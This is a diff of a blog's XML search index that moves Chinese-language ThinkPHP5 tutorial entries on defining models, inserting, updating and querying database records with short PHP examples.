+<h2 id="3丶批量更新数据"><a href="#3丶批量更新数据" class="headerlink" title="3丶批量更新数据"></a><font color=green>3丶批量更新数据</font></h2><p><img src="https://i.imgur.com/S6Nxat1.png" alt="1"> </p>
+<h2 id="4丶通过数据库类更新数据"><a href="#4丶通过数据库类更新数据" class="headerlink" title="4丶通过数据库类更新数据"></a><font color=green>4丶通过数据库类更新数据</font></h2><p><img src="https://i.imgur.com/3DRiYoV.png" alt="1"> </p>
+<h2 id="5丶静态方法"><a href="#5丶静态方法" class="headerlink" title="5丶静态方法"></a><font color=green>5丶静态方法</font></h2><p><img src="https://i.imgur.com/MppLkpE.png" alt="1"> </p>
 ]]></content>
       <categories>
         <category>thinkphp5</category>
@@ -866,33 +859,21 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>8.thinkphp5模型定义与新增数据</title>
-    <url>/undefined/8.thinkphp5%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE/</url>
-    <content><![CDATA[<h1 id="一丶模型定义与新增数据"><a href="#一丶模型定义与新增数据" class="headerlink" title="一丶模型定义与新增数据"></a><font color=red>一丶模型定义与新增数据</font></h1><h2 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a><font color=red>模型定义</font></h2><p><font color=red size=3>大多数情况下，我们无需为模型定义任何的属性和方法即可完成基础的操作。   </p>
-<p>因为模型会自动对应一个数据表。   </font></p>
-<p>规范是：数据库前缀+当前的模型类名（不含命名空间）因为模型类名是驼峰法，所以获取实际的数据表的时候会自动转换为小写+下划线命名的数据表名称。<br><font color = green size=3>先在数据库创建一个think_user数据表：<br><img src="https://i.imgur.com/Wu2V5it.png" alt="1"></p>
-<p>模型定义的话先在application下，index模块下创建一个模型文件夹，创建一个User.php模型</font><br><img src="https://i.imgur.com/cUz5yF7.png" alt="1"><br>然后按照图示命名空间和继承thinkphp下的Modle模型；<br>然后在controller控制器下创建User.php控制器</p>
-<h2 id="新增数据1"><a href="#新增数据1" class="headerlink" title="新增数据1"></a><font color=red>新增数据1</font></h2><p><img src="https://i.imgur.com/Xtf2ymH.png" alt="1">   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;save()</span><br></pre></td></tr></table></figure></div>
-<p>$user调用save（）这个方法；如果调用save这个方法有返回值，就表示用户新增成功</p>
-<h2 id="新增数据2（使用create方法）"><a href="#新增数据2（使用create方法）" class="headerlink" title="新增数据2（使用create方法）"></a><font color=red>新增数据2（使用create方法）</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">$user[<span class="string">'name'</span>]=<span class="string">'yym'</span>;   </span><br><span class="line">$user[<span class="string">'email'</span>]=<span class="string">'1806849051@qq.com'</span>;   </span><br><span class="line">$user[<span class="string">'birthday'</span>]=strtotime(<span class="string">'1999-12-14'</span>);</span><br><span class="line"><span class="keyword">if</span>($result = UserModel::create($user))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增成功'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增失败'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<h2 id="新增数据3（批量新增数据）"><a href="#新增数据3（批量新增数据）" class="headerlink" title="新增数据3（批量新增数据）"></a><font color=red>新增数据3（批量新增数据）</font></h2><p><img src="https://i.imgur.com/3schQ0t.png" alt="1"> </p>
-]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>9.thinkphp5模型操作之更新数据</title>
-    <url>/undefined/9.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE/</url>
-    <content><![CDATA[<h1 id="一丶模型操作之更新数据"><a href="#一丶模型操作之更新数据" class="headerlink" title="一丶模型操作之更新数据"></a><font color=red>一丶模型操作之更新数据</font></h1><h2 id="1丶查找并更新"><a href="#1丶查找并更新" class="headerlink" title="1丶查找并更新"></a><font color=green>1丶查找并更新</font></h2><p><img src="https://i.imgur.com/rHDc90y.png" alt="1"><br><font size=3>解释：  </font><br>调用UserModel模型的get方法;<br>“（1）”表示get主键为1的数据<br>save（）方法判断</p>
-<h2 id="2丶直接更新数据"><a href="#2丶直接更新数据" class="headerlink" title="2丶直接更新数据"></a><font color=green>2丶直接更新数据</font></h2><p><img src="https://i.imgur.com/XUUONWY.png" alt="1"><br><font size=3>解释：  </font><br>还是调用get方法选择数据<br>save（）方法直接进行保存，将name保存为刘涛</p>
-<h2 id="3丶批量更新数据"><a href="#3丶批量更新数据" class="headerlink" title="3丶批量更新数据"></a><font color=green>3丶批量更新数据</font></h2><p><img src="https://i.imgur.com/S6Nxat1.png" alt="1"> </p>
-<h2 id="4丶通过数据库类更新数据"><a href="#4丶通过数据库类更新数据" class="headerlink" title="4丶通过数据库类更新数据"></a><font color=green>4丶通过数据库类更新数据</font></h2><p><img src="https://i.imgur.com/3DRiYoV.png" alt="1"> </p>
-<h2 id="5丶静态方法"><a href="#5丶静态方法" class="headerlink" title="5丶静态方法"></a><font color=green>5丶静态方法</font></h2><p><img src="https://i.imgur.com/MppLkpE.png" alt="1"> </p>
+    <title>7.thinkphp5数据库查询之查询构造器2</title>
+    <url>/undefined/7.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A82/</url>
+    <content><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="一丶查询数据"><a href="#一丶查询数据" class="headerlink" title="一丶查询数据"></a><font color = green >一丶查询数据</font></h2><p>最普通的查询就是判断某个字段是否等于某个值，而select（）方法用于查询数据集，如果查询成功，返回的是一个二维数组，如果没有满足条件的话则返回空数组。      </p>
+<p>find（）方法用于查找满足条件的第一个记录（即使你的查询条件有多个符合的数据），如果查询成功，返回的是一个一维数组，没有满足条件的话默认返回null；   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>find();   </span><br><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
+<h2 id="模糊查询："><a href="#模糊查询：" class="headerlink" title="模糊查询："></a><font color = green >模糊查询：</font></h2><p><font color = green >查询name中含有’明’的数据</font></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'name'</span>,<span class="string">'like'</span>,<span class="string">'%明%'</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
+<h2 id="区间查询："><a href="#区间查询：" class="headerlink" title="区间查询："></a><font color = green >区间查询：</font></h2><p><font color = green >查询id区间为2~6的数据</font></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'id'</span>,<span class="string">'BETWEEN'</span>,[<span class="number">2</span>,<span class="number">6</span>])</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
+<h2 id="二丶添加数据："><a href="#二丶添加数据：" class="headerlink" title="二丶添加数据："></a><font color = green >二丶添加数据：</font></h2><h2 id="添加多条数据："><a href="#添加多条数据：" class="headerlink" title="添加多条数据："></a><font color = green >添加多条数据：</font></h2><p>添加多条数据直接向Db类的insertAll方法传入需要添加的数据即可。<br><img src="https://i.imgur.com/AJwt1dE.png" alt="1">   </p>
+<h2 id="三丶更新数据："><a href="#三丶更新数据：" class="headerlink" title="三丶更新数据："></a><font color = green >三丶更新数据：</font></h2><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setFileld(‘name’,’thinkphp’);<br>setFiled方法返回数据的条数，没修改任何数据字段返回0；</p>
+<h2 id="四丶自增或自减一个字段的值："><a href="#四丶自增或自减一个字段的值：" class="headerlink" title="四丶自增或自减一个字段的值："></a><font color = green >四丶自增或自减一个字段的值：</font></h2><p>setInc/setDec如果不加第二个参数，默认值为1   </p>
+<h3 id="score-字段加1"><a href="#score-字段加1" class="headerlink" title="score 字段加1"></a><font color=green>score 字段加1</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’);   </p>
+<h3 id="score-字段加5"><a href="#score-字段加5" class="headerlink" title="score 字段加5"></a><font color=green>score 字段加5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’,5); </p>
+<h3 id="score-字段减5"><a href="#score-字段减5" class="headerlink" title="score 字段减5"></a><font color=green>score 字段减5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setDec(‘status’,5);  </p>
 ]]></content>
       <categories>
         <category>thinkphp5</category>
@@ -983,6 +964,26 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </categories>
       <tags>
         <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>8.thinkphp5模型定义与新增数据</title>
+    <url>/undefined/8.thinkphp5%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE/</url>
+    <content><![CDATA[<h1 id="一丶模型定义与新增数据"><a href="#一丶模型定义与新增数据" class="headerlink" title="一丶模型定义与新增数据"></a><font color=red>一丶模型定义与新增数据</font></h1><h2 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a><font color=red>模型定义</font></h2><p><font color=red size=3>大多数情况下，我们无需为模型定义任何的属性和方法即可完成基础的操作。   </p>
+<p>因为模型会自动对应一个数据表。   </font></p>
+<p>规范是：数据库前缀+当前的模型类名（不含命名空间）因为模型类名是驼峰法，所以获取实际的数据表的时候会自动转换为小写+下划线命名的数据表名称。<br><font color = green size=3>先在数据库创建一个think_user数据表：<br><img src="https://i.imgur.com/Wu2V5it.png" alt="1"></p>
+<p>模型定义的话先在application下，index模块下创建一个模型文件夹，创建一个User.php模型</font><br><img src="https://i.imgur.com/cUz5yF7.png" alt="1"><br>然后按照图示命名空间和继承thinkphp下的Modle模型；<br>然后在controller控制器下创建User.php控制器</p>
+<h2 id="新增数据1"><a href="#新增数据1" class="headerlink" title="新增数据1"></a><font color=red>新增数据1</font></h2><p><img src="https://i.imgur.com/Xtf2ymH.png" alt="1">   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;save()</span><br></pre></td></tr></table></figure></div>
+<p>$user调用save（）这个方法；如果调用save这个方法有返回值，就表示用户新增成功</p>
+<h2 id="新增数据2（使用create方法）"><a href="#新增数据2（使用create方法）" class="headerlink" title="新增数据2（使用create方法）"></a><font color=red>新增数据2（使用create方法）</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">$user[<span class="string">'name'</span>]=<span class="string">'yym'</span>;   </span><br><span class="line">$user[<span class="string">'email'</span>]=<span class="string">'1806849051@qq.com'</span>;   </span><br><span class="line">$user[<span class="string">'birthday'</span>]=strtotime(<span class="string">'1999-12-14'</span>);</span><br><span class="line"><span class="keyword">if</span>($result = UserModel::create($user))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增成功'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'用户新增失败'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="新增数据3（批量新增数据）"><a href="#新增数据3（批量新增数据）" class="headerlink" title="新增数据3（批量新增数据）"></a><font color=red>新增数据3（批量新增数据）</font></h2><p><img src="https://i.imgur.com/3schQ0t.png" alt="1"> </p>
+]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
       </tags>
   </entry>
   <entry>
